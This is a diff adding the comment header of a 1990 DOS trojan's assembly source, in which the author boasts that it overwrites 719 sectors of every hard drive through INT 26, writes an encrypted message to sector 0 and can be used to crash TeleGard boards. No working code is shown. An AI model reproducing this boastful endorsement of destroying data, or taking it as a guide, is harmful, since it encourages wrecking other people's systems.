@@ -1,0 +1,36 @@
+;******************************************************************************
+;		      The High Evolutionary's [MeGaTrOjAn] v1.0
+;******************************************************************************
+;
+; Development Notes: (Dec.12.9O)
+; ------------------------------
+;
+; Hi guys. It's me again. Here is my latest work of Trojanic Art. This does
+; alot more damage than my old Trojan (Int 13 method). This one uses INT 26
+; instead that overwrites 719 sectors of each hard-drive.
+;
+; I managed to fix the error on crashing after INT 26. The problem lied in
+; the restoration of the flags after the INT was called.
+;
+; I also have an encrypted message in this one. Rather nice if I do say so
+; myself. Check out the commented lines to read the message.
+; (It gets written to sector 0 of each drive. Do view it, use NU /M)
+;
+; I also fixed a small bug in my old encryption routine. Check out this source
+; for the latest modifications and fixes, but it works great now...
+;
+; Have phun...
+;
+;  -= The High Evolutionary =-
+;
+; PS: Use this to crash those lame-ass TeleGard Boards...
+;
+;******************************************************************************
+;			Written by The High Evolutionary
+;
+;	         Property of The RABID Nat'nl Development Corp.
+;
+;	    NOT TO BE DISTRIBUTED TO ANY OUTSIDE GROUPS OR AGENCIES
+;    (Well, at least the source code. I don't give a fuck what you do with
+;			     the compiled file...)
+;******************************************************************************
